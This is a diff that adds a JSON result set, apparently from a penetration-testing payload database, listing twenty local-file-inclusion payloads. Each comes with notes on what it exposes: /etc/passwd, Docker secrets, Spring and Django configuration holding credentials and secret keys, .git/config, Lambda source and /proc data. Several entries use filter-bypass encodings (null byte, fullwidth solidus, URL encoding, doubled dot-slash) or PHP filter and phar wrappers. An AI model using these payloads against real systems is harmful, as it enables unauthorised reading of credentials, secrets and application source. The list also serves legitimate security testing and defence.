@@ -1,0 +1,367 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "lfi"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "362832111c4aa702",
+      "payload": "../../../proc/1/cgroup",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Read cgroup info for PID 1. Presence of /docker/ or container ID confirms containerized environment.",
+      "source": "ensphere",
+      "tags": [
+        "container",
+        "docker",
+        "linux",
+        "recon"
+      ]
+    },
+    {
+      "id": "4cc0431ecf4318f2",
+      "payload": "../../../proc/self/cmdline",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Read process command line. Reveals application startup command.",
+      "source": "ensphere",
+      "tags": [
+        "cmdline",
+        "linux",
+        "proc"
+      ]
+    },
+    {
+      "id": "6aeb636ac529277b",
+      "payload": "../../../proc/self/mountinfo",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Read mount info. Reveals overlay filesystem and container volume mounts.",
+      "source": "ensphere",
+      "tags": [
+        "container",
+        "docker",
+        "linux",
+        "mountinfo",
+        "recon"
+      ]
+    },
+    {
+      "id": "013f4c4415f96a63",
+      "payload": "../../../WEB-INF/classes/application.properties",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Spring Boot application.properties. Contains datasource URLs, credentials, and secrets.",
+      "source": "ensphere",
+      "tags": [
+        "config",
+        "java",
+        "secrets",
+        "spring"
+      ]
+    },
+    {
+      "id": "01a73fd63906fc88",
+      "payload": "../../../run/secrets/SECRET_NAME",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [
+        "SECRET_NAME"
+      ],
+      "notes": "Docker secrets mount path. Secrets are mounted as files under /run/secrets/ in Docker Swarm.",
+      "source": "ensphere",
+      "tags": [
+        "docker",
+        "linux",
+        "secrets",
+        "swarm"
+      ]
+    },
+    {
+      "id": "0b52b7fdbac9728e",
+      "payload": "../../../config/config.yml",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Generic YAML config file. Common in Rails, Spring Boot, and many frameworks.",
+      "source": "ensphere",
+      "tags": [
+        "config",
+        "recon",
+        "yaml"
+      ]
+    },
+    {
+      "id": "116e9a613f6e9e65",
+      "payload": "../../../etc/passwd%00",
+      "technique": "null_byte",
+      "injection_surface": "query",
+      "encoding": "null_byte",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Null byte truncation. Strips appended extension (e.g., .php). Legacy PHP only.",
+      "source": "ensphere",
+      "tags": [
+        "legacy",
+        "linux",
+        "null_byte",
+        "php"
+      ]
+    },
+    {
+      "id": "1411003616dafe3a",
+      "payload": "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "unicode",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Fullwidth solidus (U+FF0F) instead of /. Some frameworks normalize this to a forward slash.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "fullwidth",
+        "linux",
+        "unicode"
+      ]
+    },
+    {
+      "id": "18e7e695bc57bbb7",
+      "payload": "../../../WEB-INF/web.xml",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Java web.xml deployment descriptor. Lists servlets, filters, security constraints, and init parameters.",
+      "source": "ensphere",
+      "tags": [
+        "config",
+        "java",
+        "recon",
+        "webinf"
+      ]
+    },
+    {
+      "id": "1fc1d084793cb58a",
+      "payload": "php://filter/convert.base64-encode/resource=index",
+      "technique": "wrapper",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Read application source via PHP filter on index (no extension needed).",
+      "source": "ensphere",
+      "tags": [
+        "filter",
+        "php",
+        "source",
+        "wrapper"
+      ]
+    },
+    {
+      "id": "2296e0759c9074f5",
+      "payload": "....//....//....//etc/passwd",
+      "technique": "directory_traversal",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double dot-slash bypass via JSON body.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "json",
+        "linux"
+      ]
+    },
+    {
+      "id": "29bfd94649d5b9fb",
+      "payload": "../../../var/task/handler.py",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "AWS Lambda Python handler. Common filename for Python Lambda functions.",
+      "source": "ensphere",
+      "tags": [
+        "aws",
+        "lambda",
+        "linux",
+        "python",
+        "source"
+      ]
+    },
+    {
+      "id": "31b95490904a8163",
+      "payload": "../../../.git/config",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Read .git/config to confirm git repo and potentially find remote URLs.",
+      "source": "ensphere",
+      "tags": [
+        "config",
+        "git",
+        "recon"
+      ]
+    },
+    {
+      "id": "321e04280ee2808e",
+      "payload": "phar://uploads/shell.jpg/shell.php",
+      "technique": "wrapper",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "PHAR wrapper to access PHP file inside PHAR archive.",
+      "source": "ensphere",
+      "tags": [
+        "phar",
+        "php",
+        "upload",
+        "wrapper"
+      ]
+    },
+    {
+      "id": "3415a743bd25622c",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Fully URL-encoded traversal path.",
+      "source": "ensphere",
+      "tags": [
+        "full",
+        "linux",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "359f4b178655814c",
+      "payload": "../../../../../../etc/passwd",
+      "technique": "directory_traversal",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Path traversal via form-encoded body field (e.g., filename, template, include).",
+      "source": "ensphere",
+      "tags": [
+        "form",
+        "linux",
+        "passwd"
+      ]
+    },
+    {
+      "id": "3b4923be58c0d837",
+      "payload": "php://filter/convert.base64-encode/resource=FILE_PATH",
+      "technique": "wrapper",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [
+        "FILE_PATH"
+      ],
+      "notes": "PHP filter wrapper. Returns base64-encoded file content. Bypasses execution.",
+      "source": "ensphere",
+      "tags": [
+        "base64",
+        "filter",
+        "php",
+        "wrapper"
+      ]
+    },
+    {
+      "id": "41aed92dd15d8174",
+      "payload": "../../../etc/passwd",
+      "technique": "directory_traversal",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Path traversal via JSON body field (e.g., filename, path parameter).",
+      "source": "ensphere",
+      "tags": [
+        "json",
+        "linux",
+        "passwd"
+      ]
+    },
+    {
+      "id": "43836e51af34e2f5",
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Windows hosts file.",
+      "source": "ensphere",
+      "tags": [
+        "hosts",
+        "windows"
+      ]
+    },
+    {
+      "id": "48eb5948335a0669",
+      "payload": "../../../app/settings.py",
+      "technique": "directory_traversal",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Django settings.py. Contains SECRET_KEY, database credentials, installed apps.",
+      "source": "ensphere",
+      "tags": [
+        "config",
+        "django",
+        "python",
+        "secrets"
+      ]
+    }
+  ]
+}
